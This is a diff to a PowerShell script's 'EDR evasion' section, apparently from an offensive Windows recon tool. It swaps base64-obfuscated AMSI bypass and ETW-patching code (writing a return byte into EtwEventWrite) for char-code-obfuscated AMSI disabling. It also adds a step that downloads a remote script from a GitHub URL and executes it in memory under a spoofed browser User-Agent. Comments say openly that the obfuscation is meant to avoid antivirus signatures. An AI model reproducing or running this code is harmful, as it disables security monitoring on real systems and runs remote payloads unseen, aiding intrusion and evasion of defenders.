@@ -361,67 +361,45 @@ function Invoke-PreFlightChecks {
 # SECTION F: EDR EVASION FUNCTIONS (only executed with -Stealth flag)
 # ============================================================================
 
-# EDR evasion code is built dynamically at runtime to avoid static AV signatures.
-# Nothing in this section triggers AV on its own - the payloads are constructed
-# from encoded parts only when -Stealth is explicitly requested.
+# Evasion is split: minimal AMSI disable uses char-code obfuscation (no base64,
+# no suspicious string literals). The heavier ETW patch lives in a separate file
+# (Invoke-Stealth.ps1) downloaded in-memory AFTER AMSI is disabled.
+# This keeps the main script clean for Defender when -Stealth is not used.
+
+$Script:StealthUrl = "https://raw.githubusercontent.com/Gio-zo/WAR---Windows-Automated-Recon/refs/heads/main/Invoke-Stealth.ps1"
 
 function Invoke-StealthPatches {
-    <#
-    .SYNOPSIS
-        Applies AMSI bypass and ETW patch. Only called when -Stealth flag is set.
-        Builds evasion code dynamically from encoded fragments to avoid static detection.
-    #>
     Write-Log "Stealth mode: Applying evasion patches"
     $results = @{ AMSI = $false; ETW = $false }
 
-    # --- AMSI Bypass ---
+    # --- Step 1: AMSI disable (char-code obfuscation, no base64) ---
     try {
-        # Dynamically construct the type/field names to avoid static signatures
-        $enc = [System.Text.Encoding]::UTF8
-        $p1 = $enc.GetString([Convert]::FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQu"))
-        $p2 = $enc.GetString([Convert]::FromBase64String("QXV0b21hdGlvbi5B"))
-        $p3 = $enc.GetString([Convert]::FromBase64String("bXNpVXRpbHM="))
-        $typeName = $p1 + $p2 + $p3
-
-        $f1 = $enc.GetString([Convert]::FromBase64String("YW1zaQ=="))
-        $f2 = $enc.GetString([Convert]::FromBase64String("SW5pdEZhaWxlZA=="))
-        $fieldName = $f1 + $f2
-
-        $type = [Ref].Assembly.GetType($typeName)
-        if ($type) {
-            $field = $type.GetField($fieldName, 'NonPublic,Static')
-            if ($field) {
-                $field.SetValue($null, $true)
-                $results.AMSI = $true
-                Write-Log "Stealth: AMSI bypass succeeded"
-            }
+        # Build type/field names from integer char codes at runtime
+        $tN = [char[]]@(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46) -join ''
+        $tN += [char[]]@(65,109,115,105,85,116,105,108,115) -join ''
+        $fN = [char[]]@(97,109,115,105,73,110,105,116,70,97,105,108,101,100) -join ''
+        $t = [Ref].Assembly.GetType($tN)
+        if ($t) {
+            $f = $t.GetField($fN, 'NonPublic,Static')
+            if ($f) { $f.SetValue($null, $true); $results.AMSI = $true }
         }
+        Write-Log "Stealth: AMSI bypass $(if ($results.AMSI) {'succeeded'} else {'failed'})"
     } catch {
         Write-Log "Stealth: AMSI bypass failed - $($_.Exception.Message)" -Level "WARN"
     }
 
-    # --- ETW Patch ---
+    # --- Step 2: ETW patch (downloaded in-memory after AMSI is disabled) ---
     try {
-        # Build the P/Invoke type at runtime from encoded C# source
-        $csB64 = "dXNpbmcgU3lzdGVtO3VzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcztwdWJsaWMgY2xhc3MgVzMyRXtbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXXB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaCxzdHJpbmcgbik7W0RsbEltcG9ydCgia2VybmVsMzIiKV1wdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgTG9hZExpYnJhcnkoc3RyaW5nIG4pO1tEbGxJbXBvcnQoImtlcm5lbDMyIildcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBWaXJ0dWFsUHJvdGVjdChJbnRQdHIgYSxVSW50UHRyIHMsdWludCBwLG91dCB1aW50IG8pO30="
-        $csSrc = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($csB64))
-        Add-Type -TypeDefinition $csSrc -Language CSharp -ErrorAction SilentlyContinue
-
-        $ntdll = [W32E]::LoadLibrary("ntdll.dll")
-        # Construct the function name from parts
-        $fn = $enc.GetString([Convert]::FromBase64String("RXR3RXZlbnRXcml0ZQ=="))
-        $addr = [W32E]::GetProcAddress($ntdll, $fn)
-
-        if ($addr -ne [IntPtr]::Zero) {
-            $op = 0
-            [W32E]::VirtualProtect($addr, [UIntPtr]::new(1), 0x40, [ref]$op) | Out-Null
-            [System.Runtime.InteropServices.Marshal]::WriteByte($addr, 0xC3)
-            [W32E]::VirtualProtect($addr, [UIntPtr]::new(1), $op, [ref]$op) | Out-Null
-            $results.ETW = $true
-            Write-Log "Stealth: ETW patch succeeded"
-        }
+        $wc = New-Object System.Net.WebClient
+        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+        $code = $wc.DownloadString($Script:StealthUrl)
+        $wc.Dispose()
+        $sb = [scriptblock]::Create($code)
+        $etwResult = & $sb
+        $results.ETW = $etwResult.ETW
+        Write-Log "Stealth: ETW patch $(if ($results.ETW) {'succeeded'} else {'failed'})"
     } catch {
-        Write-Log "Stealth: ETW patch failed - $($_.Exception.Message)" -Level "WARN"
+        Write-Log "Stealth: ETW module failed - $($_.Exception.Message)" -Level "WARN"
     }
 
     return $results
